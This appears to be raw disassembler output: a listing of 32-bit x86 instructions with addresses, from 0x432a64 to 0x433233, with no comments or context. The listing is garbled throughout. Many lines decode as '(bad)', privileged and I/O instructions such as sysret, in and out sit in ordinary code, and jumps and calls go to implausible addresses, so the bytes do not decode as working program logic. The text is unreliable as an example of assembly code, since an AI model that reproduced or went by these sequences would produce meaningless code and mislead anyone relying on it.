  432a64:	std    
  432a65:	mov    bh,bh
  432a67:	mov    BYTE PTR [ebp-0x75],al
  432a6a:	mov    edi,eax
  432a6c:	or     al,0x89
  432a6e:	inc    ebp
  432a6f:	clc    
  432a70:	mov    esp,esp
  432a72:	hlt    
  432a73:	call   DWORD PTR [edi-0x37]
  432a76:	push   esp
  432a77:	or     al,0x51
  432a79:	push   ebp
  432a7a:	xor    ebp,esp
  432a7c:	mov    esi,0x457251
  432a81:	xor    esi,eax
  432a83:	pushf  
  432a84:	inc    ebp
  432a85:	(bad)  
  432a86:	mov    edi,eax
  432a88:	or     al,0x85
  432a8a:	add    al,bh
  432a8c:	inc    eax
  432a8e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432a92:	or     ah,bh
  432a94:	inc    eax
  432a95:	push   esp
  432a96:	jmp    0x432ae9
  432a98:	mov    eax,DWORD PTR ds:0xe8720c
  432a9e:	mov    DWORD PTR [ebp-0x8],eax
  432aa1:	jne    0x432ae8
  432aa3:	jmp    0x432a30
  432aa5:	mov    ebp,DWORD PTR [eax]
  432aa7:	clc    
  432aa8:	retf   0xff54
  432aab:	push   ecx
  432aac:	mov    DWORD PTR ds:0x757210,eax
  432ab2:	mov    ecx,DWORD PTR [ebp-0x4]
  432ab5:	sub    esp,DWORD PTR [ebx-0x77]
  432ab8:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432abf:	or     ah,bh
  432ac1:	pop    es
  432ac2:	ds fwait
  432ac4:	push   DWORD PTR [edx]
  432ac6:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  432acc:	(bad)  
  432acd:	mov    bh,bh
  432acf:	jmp    0x432abd
  432ad1:	leave  
  432ad2:	jne    0x432adc
  432ad4:	call   0x30242e
  432ad9:	in     al,dx
  432ada:	dec    ebp
  432adb:	add    dh,BYTE PTR [ebx]
  432add:	add    BYTE PTR [ebx],al
  432adf:	inc    ebp
  432ae0:	cmp    esi,DWORD PTR [ecx]
  432ae2:	je     0x432a80
  432ae4:	mov    eax,edi
  432ae6:	or     al,0xf0
  432ae8:	add    BYTE PTR [ebp+0x458bf845],al
  432aee:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432af4:	adc    al,0x7
  432af6:	enter  0x9fc0,0xa5
  432afa:	rol    BYTE PTR [eax],0x5e
  432afd:	mov    ecx,ecx
  432aff:	or     al,0xc
  432b01:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432b08:	jmp    0x432b09
  432b0a:	push   ebp
  432b0b:	mov    esp,ebp
  432b0d:	cld    
  432b0e:	inc    ebp
  432b0f:	inc    ebp
  432b10:	or     DWORD PTR [ecx+0x457dec10],0x0
  432b17:	push   esi
  432b18:	push   esi
  432b19:	mov    edi,0x7af080f
  432b1e:	add    bh,al
  432b20:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432b26:	add    BYTE PTR [ecx+0x4540100f],cl
  432b2c:	mov    ebp,eax
  432b2e:	mov    ebp,edi
  432b30:	lock call edx
  432b33:	fcom   DWORD PTR [ebp+0x45]
  432b36:	mov    eax,0x148a8b
  432b3b:	push   ecx
  432b3c:	enter  0xc145,0x83
  432b40:	cmp    ecx,DWORD PTR [eax]
  432b42:	add    BYTE PTR [ebp+0x4d],al
  432b45:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432b4b:	call   0xffa326ba
  432b50:	cmp    eax,DWORD PTR [ebp-0xc]
  432b53:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432b57:	push   ebp
  432b58:	(bad)  
  432b59:	call   0x34295d
  432b5e:	mov    bh,0xdb
  432b60:	cld    
  432b61:	or     BYTE PTR [ebp+0x45],bl
  432b64:	(bad)  
  432b65:	call   0xff7d27f5
  432b6a:	add    al,BYTE PTR [ebp+0x37]
  432b6d:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432b73:	jne    0x432b75
  432b75:	(bad)  
  432b76:	cmp    edi,esp
  432b78:	jne    0x432bab
  432b7a:	mov    edi,edi
  432b7c:	or     BYTE PTR [ebx-0x307f0b49],cl
  432b82:	pop    ds
  432b83:	into   
  432b84:	je     0x432b47
  432b86:	mov    ebx,DWORD PTR [esi]
  432b88:	or     BYTE PTR [ebp-0x49],al
  432b8b:	mov    esp,DWORD PTR [esi-0x77]
  432b8e:	mov    esi,0x2451f0c
  432b93:	mov    eax,DWORD PTR [eax]
  432b95:	or     al,0x66
  432b97:	sar    bl,0x3b
  432b9a:	xor    esi,DWORD PTR [ebp+0x66]
  432b9d:	xor    ecx,edi
  432b9f:	pop    edi
  432ba0:	adc    bl,BYTE PTR [ebx+0x7e]
  432ba3:	ret    0xff
  432ba6:	cld    
  432ba7:	inc    ebp
  432ba8:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432bae:	cld    
  432baf:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432bb6:	push   0xffffff83
  432bb8:	pop    edi
  432bb9:	or     BYTE PTR [ebp+0x53],dh
  432bbc:	xorps  xmm1,xmm2
  432bbf:	test   BYTE PTR [eax+eax*1],bh
  432bc2:	add    BYTE PTR [eax],al
  432bc4:	adc    eax,eax
  432bc6:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432bce:	jmp    DWORD PTR [eax]
  432bd0:	ror    al,0x5e
  432bd3:	inc    ebp
  432bd4:	leave  
  432bd5:	xor    ecx,DWORD PTR [eax]
  432bd7:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432bdd:	add    ah,al
  432bdf:	xor    edi,edi
  432be1:	xor    DWORD PTR [ebx],0x66003302
  432be7:	mov    DWORD PTR [ebp-0xc],ecx
  432bea:	pcmpgtw mm0,mm0
  432bed:	add    dl,ah
  432bef:	leave  
  432bf0:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432bf4:	push   eax
  432bf5:	dec    ebp
  432bf6:	mov    esi,DWORD PTR [ebx-0x75]
  432bf9:	lea    ebp,[eax-0x7c00ff02]
  432bff:	xor    eax,DWORD PTR [eax]
  432c01:	sysret 
  432c03:	dec    ebp
  432c04:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432c0b:	push   WORD PTR [ecx+0x8]
  432c0f:	jne    0x432bd2
  432c11:	ud0    ecx,DWORD PTR [ecx]
  432c14:	mov    eax,edx
  432c16:	lods   al,BYTE PTR ds:[esi]
  432c17:	add    BYTE PTR [eax],al
  432c19:	data16 (bad) 
  432c1b:	iret   
  432c1c:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432c23:	cli    
  432c24:	inc    ebp
  432c25:	cmp    al,0x8d
  432c27:	add    BYTE PTR [esi+0x2d],ah
  432c2a:	inc    ebp
  432c2b:	pop    ebp
  432c2c:	lea    ecx,[edi]
  432c2e:	mov    dl,bh
  432c30:	add    BYTE PTR [edi],cl
  432c32:	mov    DWORD PTR [eax+eax*8],edi
  432c35:	mov    ebx,0x3b87
  432c3a:	add    BYTE PTR [ebx],ch
  432c3c:	inc    ebp
  432c3d:	data16 (bad) 
  432c3f:	clc    
  432c40:	int3   
  432c41:	cmp    eax,DWORD PTR [eax]
  432c43:	je     0x432bce
  432c45:	push   0xffffffc8
  432c47:	pop    edi
  432c48:	xchg   DWORD PTR [ebp+0x0],eax
  432c4b:	data16 add BYTE PTR [ebp+0x45],cl
  432c4f:	lea    cx,[ebp+0x10]
  432c53:	jb     0x432c55
  432c55:	jmp    0x432be0
  432c57:	call   eax
  432c59:	clc    
  432c5a:	xchg   DWORD PTR [edi+0x1],edi
  432c5d:	mov    eax,DWORD PTR [eax]
  432c5f:	or     BYTE PTR [ebp-0x49],al
  432c62:	lea    eax,[eax+0x74003154]
  432c68:	push   edi
  432c69:	inc    edx
  432c6a:	jge    0x432c6b
  432c6c:	mov    DWORD PTR [edi],ecx
  432c6e:	fdiv   DWORD PTR [edi-0x6]
  432c71:	inc    DWORD PTR [eax]
  432c73:	xor    edx,DWORD PTR [eax+0x5f]
  432c76:	xchg   DWORD PTR [ebx+0x1],ebx
  432c79:	ret    0x0
  432c7c:	xor    BYTE PTR [ebp-0x51],cl
  432c7f:	cmp    edi,0xf0ff89fe
  432c85:	data16 ror al,0x84
  432c89:	rol    BYTE PTR [eax],0x3b
  432c8c:	add    al,dh
  432c8e:	dec    eax
  432c8f:	xchg   esp,eax
  432c90:	push   ebx
  432c91:	jmp    0x432c1e
  432c93:	push   ebp
  432c94:	add    esp,ebp
  432c96:	add    ebp,esp
  432c98:	mov    edx,DWORD PTR [edi+0x24]
  432c9b:	clc    
  432c9c:	dec    esi
  432c9d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432ca3:	cmp    BYTE PTR [ebx],al
  432ca5:	jne    0x432c30
  432ca7:	xor    esp,eax
  432ca9:	jmp    0x462e2c
  432cae:	add    ebp,DWORD PTR [ecx+ecx*4]
  432cb1:	jne    0x432ca7
  432cb3:	call   0xffcd2a0d
  432cb8:	clc    
  432cb9:	xchg   edi,eax
  432cba:	sti    
  432cbb:	add    DWORD PTR [ebx],eax
  432cbd:	add    BYTE PTR [ebp+0x47],bl
  432cc0:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432cc6:	pop    ebp
  432cc7:	mov    DWORD PTR [esi-0x48],esi
  432cca:	jmp    0x432d13
  432ccc:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432cd2:	(bad)  
  432cd4:	cmp    al,0x0
  432cd6:	cmp    eax,DWORD PTR [ebp+0x18]
  432cd9:	lea    ebx,[ebp-0x56]
  432cdc:	jle    0x432cde
  432cde:	jae    0x432c69
  432ce0:	mov    eax,esp
  432ce2:	call   0xb900:0x8b005587
  432ce9:	inc    ebp
  432cea:	push   ebp
  432ceb:	lea    ecx,[ebp-0x27ff4f12]
  432cf1:	mov    eax,edi
  432cf3:	int3   
  432cf4:	push   ebp
  432cf5:	xchg   edi,eax
  432cf7:	add    esp,ebp
  432cf9:	add    BYTE PTR [eax],al
  432cfb:	inc    ebp
  432cfc:	add    BYTE PTR [ebp+0x8b3255],cl
  432d02:	cld    
  432d03:	mov    DWORD PTR [edx],edi
  432d05:	aam    0x75
  432d07:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432d0d:	mov    DWORD PTR [ebx-0x50],edx
  432d10:	test   BYTE PTR [ebp-0x1],0xe8
  432d14:	mov    eax,DWORD PTR [eax]
  432d16:	hlt    
  432d17:	add    al,al
  432d19:	mov    eax,DWORD PTR ds:0x890045a8
  432d1f:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432d25:	inc    DWORD PTR [eax*2+0xf75854d]
  432d2c:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432d32:	call   0x72998a73
  432d37:	je     0x432d97
  432d39:	js     0x432d9a
  432d3b:	lock ret 0x7e
  432d3f:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432d45:	mov    edi,edi
  432d47:	sbb    al,bl
  432d49:	clc    
  432d4a:	add    BYTE PTR [ebp-0x73],bh
  432d4d:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432d53:	ror    BYTE PTR [eax],1
  432d55:	dec    ebp
  432d56:	xchg   ebp,eax
  432d57:	mov    edi,edi
  432d59:	in     al,0x8b
  432d5b:	jge    0x432ce6
  432d5d:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432d63:	clc    
  432d64:	pop    esi
  432d65:	fist   DWORD PTR [ebp+0x5d398b5d]
  432d6b:	clc    
  432d6c:	add    al,0x6e
  432d6e:	mov    eax,DWORD PTR [ebx]
  432d70:	mov    BYTE PTR [ebp+0x0],dl
  432d73:	mov    edx,DWORD PTR [ebx-0x20]
  432d76:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432d7c:	add    eax,0x3b3b73
  432d81:	adc    al,0x89
  432d83:	pop    eax
  432d84:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432d88:	ret    0xf08
  432d8b:	cmp    al,0x2
  432d8d:	mov    edx,eax
  432d8f:	cld    
  432d90:	add    BYTE PTR [ebp+0x66],dl
  432d93:	add    eax,ebx
  432d95:	add    esp,eax
  432d97:	sub    eax,eax
  432d99:	or     BYTE PTR [ecx-0x77f474bb],cl
  432d9f:	add    BYTE PTR [eax],al
  432da1:	mov    DWORD PTR [ebx-0x24],ebx
  432da4:	push   edi
  432da5:	push   ebp
  432da6:	clc    
  432da7:	add    DWORD PTR [esi+0x1b0100],0x45
  432dae:	out    0xff,eax
  432db0:	add    edx,DWORD PTR [eax]
  432db2:	jmp    0x432d9c
  432db4:	cmp    ch,0x46
  432db7:	(bad)  
  432db8:	jmp    0x40c8b60a
  432dbd:	je     0x432d49
  432dbf:	mov    eax,DWORD PTR [eax-0x10c78104]
  432dc5:	inc    ebp
  432dc6:	add    BYTE PTR [ebx-0x770375],al
  432dcc:	add    ah,ch
  432dce:	add    edx,esp
  432dd0:	pop    edi
  432dd1:	pop    ebp
  432dd2:	push   ebp
  432dd3:	inc    ebx
  432dd4:	in     al,dx
  432dd5:	pop    ebp
  432dd6:	in     al,dx
  432dd7:	cmp    edx,DWORD PTR [edi-0x8]
  432dda:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432de1:	add    al,0x47
  432de3:	push   ebp
  432de4:	mov    esp,ebp
  432de6:	in     al,0x45
  432de8:	dec    ebp
  432de9:	push   esi
  432dea:	test   DWORD PTR [eax+0xfb010f],esi
  432df0:	add    BYTE PTR [eax+0xc018b],dh
  432df6:	leave  
  432df7:	inc    ebp
  432df8:	test   al,ch
  432dfa:	add    dh,bh
  432dfc:	add    bh,bh
  432dfe:	dec    ebp
  432dff:	push   cs
  432e00:	mov    DWORD PTR [ecx],eax
  432e02:	hlt    
  432e03:	push   es
  432e04:	dec    ebp
  432e05:	leave  
  432e06:	mov    DWORD PTR [eax],ecx
  432e08:	clc    
  432e09:	cmovge eax,ecx
  432e0c:	mov    ecx,0x85c2f0
  432e12:	clc    
  432e13:	pop    DWORD PTR [ebp+0x1]
  432e16:	push   ebx
  432e17:	add    BYTE PTR [ebp-0x15],bh
  432e1a:	push   esi
  432e1b:	xor    eax,0x898a45
  432e20:	cld    
  432e21:	add    al,BYTE PTR [ebp+0x0]
  432e24:	xor    esp,DWORD PTR [esi-0x64]
  432e27:	add    DWORD PTR [esi+0x78308c1],edi
  432e2d:	add    ah,BYTE PTR [ebp-0x49]
  432e30:	int    0xbb
  432e32:	mov    ecx,DWORD PTR [esi+0xc]
  432e35:	add    dh,al
  432e37:	cmp    ecx,ebx
  432e39:	jne    0x432e03
  432e3b:	xor    ecx,DWORD PTR [ebp+0x66]
  432e3e:	jmp    0xca2e44
  432e43:	add    DWORD PTR [ebp+0x0],eax
  432e46:	mov    eax,ebx
  432e48:	or     al,0x8b
  432e4a:	(bad)  
  432e4b:	mov    ecx,esi
  432e4d:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432e54:	mov    eax,edi
  432e56:	or     BYTE PTR [edx],cl
  432e58:	shl    cl,cl
  432e5a:	icebp  
  432e5b:	add    BYTE PTR [ebp+0x38],0x8b
  432e5f:	or     BYTE PTR [edx+eax*2],cl
  432e62:	(bad)  
  432e63:	or     cl,dh
  432e65:	stc    
  432e66:	shl    DWORD PTR [ebp-0x30],0xc6
  432e6a:	xor    al,0x0
  432e6c:	inc    ebp
  432e6d:	xchg   BYTE PTR [ebx],al
  432e6f:	add    esp,edi
  432e71:	add    BYTE PTR [ebp-0x39],cl
  432e74:	mov    al,bl
  432e76:	test   DWORD PTR [ebx+0x1c348375],ecx
  432e7c:	sub    al,0xbf
  432e7e:	jmp    0x432e05
  432e80:	mov    edi,eax
  432e82:	lock jge 0x432e76
  432e85:	lea    esi,[edx-0x74bad5ff]
  432e8b:	mov    ebp,esp
  432e8d:	or     cl,dh
  432e8f:	leave  
  432e90:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432e97:	dec    ebp
  432e98:	dec    ebp
  432e99:	test   DWORD PTR [ebx],eax
  432e9b:	paddb  mm6,mm0
  432e9e:	add    DWORD PTR [eax],eax
  432ea0:	dec    ebp
  432ea1:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432ea7:	mov    esi,DWORD PTR [edx]
  432ea9:	or     al,0x2b
  432eab:	dec    ebp
  432eac:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432eb2:	mov    esp,edi
  432eb4:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432ebb:	mov    DWORD PTR [ebx],ebp
  432ebd:	call   0xc76b7ed
  432ec2:	mov    DWORD PTR [ebp+0x10],ecx
  432ec5:	(bad)  
  432ec6:	push   0x8b85ff10
  432ecb:	clc    
  432ecc:	or     al,0x54
  432ece:	(bad)  
  432ecf:	push   ecx
  432ed0:	retf   
  432ed1:	mov    ebx,0xff4d8dc8
  432ed6:	mov    DWORD PTR [ebp+0x8],eax
  432ed9:	xor    eax,DWORD PTR [ebp-0x75]
  432edc:	cmp    ebp,DWORD PTR [ebx]
  432ede:	lsl    ebx,WORD PTR [edi-0x8]
  432ee2:	call   DWORD PTR [ebx-0x741bff75]
  432ee8:	(bad)  
  432ee9:	or     al,0x5b
  432eeb:	dec    ebp
  432eec:	or     BYTE PTR [ebx],dh
  432eee:	inc    ebp
  432eef:	xor    esi,DWORD PTR ds:0x708088d
  432ef5:	in     eax,0x9b
  432ef7:	add    BYTE PTR [edx],dh
  432ef9:	inc    ebp
  432efa:	pop    edi
  432efb:	xor    eax,edx
  432efd:	test   DWORD PTR [eax],0x81108b8b
  432f03:	dec    ebp
  432f04:	sub    al,0x33
  432f06:	add    BYTE PTR [ebx],dh
  432f08:	push   esi
  432f09:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432f0f:	mov    edi,eax
  432f11:	or     BYTE PTR [ebp+0x45],al
  432f14:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432f1a:	xor    ecx,ecx
  432f1c:	pushf  
  432f1d:	push   es
  432f1e:	mov    DWORD PTR [esi-0x4],0xf8178538
  432f25:	dec    ebp
  432f26:	inc    ebp
  432f27:	cmp    BYTE PTR [ecx],0x54
  432f2a:	pushf  
  432f2b:	gs (bad) 
  432f2d:	shl    esp,1
  432f2f:	dec    ebp
  432f30:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432f36:	shr    ecx,1
  432f38:	xlat   BYTE PTR ds:[ebx]
  432f39:	rol    bh,cl
  432f3b:	mov    edx,esp
  432f3d:	or     BYTE PTR [ebp+0x4588f84d],al
  432f43:	mov    ecx,DWORD PTR [eax]
  432f45:	or     BYTE PTR [eax],al
  432f47:	push   ebp
  432f48:	mov    edi,DWORD PTR [eax+0xfc728b]
  432f4e:	dec    ebp
  432f4f:	enter  0xceba,0x8
  432f53:	retf   0x1807
  432f56:	ret    0x9b4d
  432f59:	mov    esi,DWORD PTR [edx]
  432f5b:	or     al,0x33
  432f5d:	into   
  432f5e:	add    edx,esi
  432f60:	add    ecx,edx
  432f62:	bswap  eax
  432f64:	ror    esi,0x98
  432f67:	dec    ebp
  432f68:	add    cl,ch
  432f6a:	mov    edi,edi
  432f6c:	hlt    
  432f6d:	inc    esi
  432f6f:	inc    ebp
  432f70:	ret    0x4533
  432f73:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432f79:	or     BYTE PTR [ebx],dh
  432f7b:	dec    ebp
  432f7c:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432f82:	jne    0xff8d2f49
  432f88:	inc    ebp
  432f89:	inc    ebp
  432f8a:	mov    esi,DWORD PTR [ebx]
  432f8c:	clc    
  432f8d:	pop    esi
  432f8e:	ret    0xcaeb
  432f91:	mov    eax,esi
  432f93:	call   0x52048466
  432f98:	dec    ebp
  432f99:	add    eax,0xf8728b
  432f9e:	adc    eax,0xce0ccac9
  432fa3:	push   ebp
  432fa4:	ret    0xc6ec
  432fa7:	in     al,dx
  432fa8:	call   0x33437cb1
  432fad:	push   edi
  432fae:	add    edi,eax
  432fb0:	xor    eax,eax
  432fb2:	jmp    0x432ff9
  432fb4:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432fba:	add    eax,edi
  432fbc:	shr    eax,cl
  432fbe:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432fc4:	mov    esi,DWORD PTR [edx]
  432fc6:	in     al,dx
  432fc7:	pushf  
  432fc8:	ret    0x84c7
  432fcb:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432fd1:	inc    ebp
  432fd2:	in     al,dx
  432fd3:	xor    DWORD PTR [ebp-0x64],eax
  432fd6:	mov    eax,edi
  432fd8:	cld    
  432fd9:	fmul   st(2),st
  432fdb:	sbb    dl,al
  432fdd:	jmp    0x9c3b:0x304d45c1
  432fe4:	jbe    0x432fad
  432fe6:	mov    esp,eax
  432fe8:	clc    
  432fe9:	add    BYTE PTR [ebp+0x0],cl
  432fec:	mov    ecx,ecx
  432fee:	lea    eax,[ebp-0x5]
  432ff1:	mov    edi,edi
  432ff3:	call   0x51ce843d
  432ff8:	hlt    
  432ff9:	xor    eax,edx
  432ffb:	mov    esi,0x9b7284
  433000:	xor    cl,dl
  433002:	mov    esi,eax
  433004:	hlt    
  433005:	into   
  433006:	inc    ebp
  433007:	scas   eax,DWORD PTR es:[edi]
  433008:	mov    ebp,ecx
  43300a:	cld    
  43300b:	add    dl,cl
  43300d:	add    dl,al
  43300f:	inc    ebp
  433010:	shr    DWORD PTR [ebx],0x4d
  433013:	xor    edi,DWORD PTR [ebx]
  433015:	mov    DWORD PTR [edi],ecx
  433017:	clc    
  433018:	dec    esi
  433019:	inc    ebp
  43301a:	dec    DWORD PTR [ebx-0x3d2b1775]
  433020:	ret    0xc6ca
  433023:	mov    BYTE PTR [ebp-0x32],0x53
  433027:	scas   eax,DWORD PTR es:[edi]
  433028:	inc    ebp
  433029:	jmp    0x43305b
  43302b:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  433032:	pop    ebx
  433033:	xor    ecx,DWORD PTR [ebp+0x3]
  433036:	mov    eax,DWORD PTR [ebx]
  433038:	clc    
  433039:	test   edx,ecx
  43303b:	mov    ecx,esi
  43303d:	cld    
  43303e:	call   0x8ab77588
  433043:	xor    ecx,DWORD PTR [eax+0x4533f303]
  433049:	add    ecx,DWORD PTR [ebx-0x4974072d]
  43304f:	fdiv   QWORD PTR [ebx]
  433051:	retf   0xce89
  433054:	in     al,0xc1
  433056:	inc    ebp
  433057:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  43305d:	into   
  43305e:	mov    dh,0xc1
  433061:	call   0x8c1775ea
  433066:	(bad)  
  433067:	cld    
  433068:	mov    ecx,DWORD PTR [ebp-0x14]
  43306b:	xor    eax,ecx
  43306d:	lea    eax,[ebp+0x8]
  433070:	mov    esi,DWORD PTR [edx-0x4]
  433073:	add    dl,al
  433075:	inc    ebp
  433076:	mov    esp,0x32d89b8b
  43307b:	dec    ebp
  43307c:	mov    esi,DWORD PTR [ebx]
  43307e:	cld    
  43307f:	xor    eax,edx
  433081:	sub    esp,DWORD PTR [ebp-0x75]
  433084:	int    0xec
  433086:	sub    ecx,eax
  433088:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  43308e:	mov    esi,esp
  433090:	call   0x34177e19
  433095:	inc    DWORD PTR [ebx]
  433097:	mov    edi,DWORD PTR [ebx]
  433099:	cld    
  43309a:	jne    0x4330e9
  43309c:	mov    esi,DWORD PTR [ebx]
  43309e:	aam    0x8d
  4330a0:	dec    ebp
  4330a1:	or     BYTE PTR [ebx],dh
  4330a3:	jb     0x4330a8
  4330a5:	add    BYTE PTR [edi+0x45],bl
  4330a8:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  4330af:	xor    ebp,esp
  4330b1:	xor    eax,edi
  4330b3:	sub    edi,esp
  4330b5:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  4330bb:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  4330c2:	inc    ebp
  4330c3:	xor    ecx,DWORD PTR [ecx+0x45891403]
  4330c9:	clc    
  4330ca:	mov    eax,edi
  4330cc:	nop
  4330cd:	fadd   QWORD PTR [eax]
  4330cf:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  4330d5:	jmp    0x433060
  4330d7:	mov    eax,DWORD PTR [ecx]
  4330d9:	fadd   DWORD PTR [eax]
  4330db:	inc    ebp
  4330dc:	or     DWORD PTR [ebx],esi
  4330de:	dec    eax
  4330df:	add    edx,DWORD PTR [ebx-0x2d]
  4330e2:	dec    ebp
  4330e3:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  4330e9:	inc    ebp
  4330ea:	push   esp
  4330eb:	mov    dl,BYTE PTR [ecx-0xd]
  4330ee:	xor    ecx,DWORD PTR [ebp-0x45]
  4330f1:	(bad)  
  4330f3:	rol    BYTE PTR [eax],0xc1
  4330f6:	ret    
  4330f7:	inc    ebp
  4330f8:	inc    ebp
  4330f9:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  4330ff:	xor    eax,ebx
  433101:	add    eax,DWORD PTR [ebp+0x23]
  433104:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43310a:	cmp    edi,0xc
  43310d:	dec    ebp
  43310e:	inc    ebp
  43310f:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433115:	inc    ebp
  433116:	mov    esi,DWORD PTR [ebx]
  433118:	clc    
  433119:	lea    eax,[ebp+0x45725407]
  43311f:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433123:	xor    edi,DWORD PTR [eax]
  433125:	mov    ecx,0xff8b8d4d
  43312a:	push   esp
  43312b:	enter  0x4df7,0x23
  43312f:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433135:	mov    eax,DWORD PTR [ebx]
  433137:	loopne 0x433124
  433139:	ret    0xc68b
  43313c:	push   esp
  43313d:	enter  0x9745,0x8b
  433141:	inc    ebp
  433142:	cld    
  433143:	mov    eax,edi
  433145:	clc    
  433146:	ret    
  433147:	ret    0xc645
  43314a:	mov    esi,DWORD PTR [ebx]
  43314c:	cld    
  43314d:	pop    esi
  43314e:	mov    ebx,0x83458bc3
  433154:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  433158:	dec    ebp
  433159:	xor    DWORD PTR [ebx],esi
  43315b:	pushf  
  43315c:	add    edi,DWORD PTR [edx-0x7767a77]
  433162:	fcom   DWORD PTR [ebp+0x45]
  433165:	mov    esi,DWORD PTR [ebx]
  433167:	adc    al,0x9c
  433169:	inc    ebp
  43316a:	(bad)  
  43316b:	mov    ebx,eax
  43316d:	adc    al,0x85
  43316f:	cmp    al,0x1
  433172:	inc    ebp
  433173:	add    BYTE PTR ds:0xe98b9c4d,bh
  433179:	mov    eax,DWORD PTR [ebx]
  43317b:	nop
  43317c:	add    BYTE PTR [eax],al
  43317e:	inc    ebp
  43317f:	mov    esi,DWORD PTR [ebx]
  433181:	add    eax,DWORD PTR [ebx]
  433183:	cmp    al,0x89
  433185:	mov    esp,esi
  433187:	clc    
  433188:	inc    ebp
  433189:	inc    ebp
  43318a:	add    edx,DWORD PTR [esi+0xc]
  43318d:	mov    edi,0x7ff0845
  433192:	in     al,dx
  433193:	(bad)  
  433194:	jne    0x433131
  433196:	mov    esi,DWORD PTR [edx]
  433198:	clc    
  433199:	add    ebp,DWORD PTR [esi]
  43319b:	mov    edi,edi
  43319d:	in     al,dx
  43319e:	mov    DWORD PTR [ebp-0x10],eax
  4331a1:	xor    eax,DWORD PTR [ebp+0x3]
  4331a4:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4331aa:	fmul   DWORD PTR [ebx-0x173caf39]
  4331b0:	lea    ecx,[ecx+0x45e8d4bc]
  4331b6:	clc    
  4331b7:	mov    edi,edi
  4331b9:	cmp    BYTE PTR [ebp+0x4d],al
  4331bc:	test   DWORD PTR [eax+0x74],ecx
  4331bf:	inc    ecx
  4331c0:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4331c6:	ret    
  4331c7:	inc    eax
  4331c8:	dec    DWORD PTR [ebx+0x4945f8f0]
  4331ce:	push   eax
  4331cf:	dec    eax
  4331d0:	test   al,0xd0
  4331d2:	dec    eax
  4331d4:	mov    eax,DWORD PTR [ebp-0x14]
  4331d7:	mov    eax,DWORD PTR [ebp+0x38]
  4331da:	mov    eax,ecx
  4331dc:	fadd   DWORD PTR [ebx]
  4331de:	dec    ebp
  4331df:	inc    eax
  4331e0:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4331e6:	inc    ebp
  4331e7:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  4331ed:	fadd   QWORD PTR [ebx]
  4331ef:	inc    ebp
  4331f0:	or     al,0x33
  4331f2:	dec    ebp
  4331f3:	add    edi,DWORD PTR [ebx]
  4331f5:	mov    DWORD PTR [edx-0x28],esi
  4331f8:	mov    eax,DWORD PTR [ebp-0x10]
  4331fb:	mov    eax,DWORD PTR [eax+0x10]
  4331fe:	mov    eax,edi
  433200:	lock ret 
  433202:	inc    ecx
  433203:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433209:	fsubr  st,st(5)
  43320b:	test   DWORD PTR [eax],eax
  43320d:	clc    
  43320e:	push   0x45
  433210:	(bad)  
  433211:	cmp    al,0xec
  433213:	pushf  
  433214:	inc    ebp
  433215:	(bad)  
  433216:	push   eax
  433217:	fsub   DWORD PTR [eax-0x7b]
  43321a:	(bad)  
  43321b:	clc    
  43321c:	mov    eax,0xf8008584
  433221:	mov    eax,DWORD PTR [ebp-0x4]
  433224:	mov    edi,0x4585c3cc
  43322a:	clc    
  43322b:	mov    eax,DWORD PTR [ebp+0x14]
  43322e:	xor    eax,DWORD PTR [ebp-0x64]
  433231:	mov    edi,eax
  433233:	in     al,dx
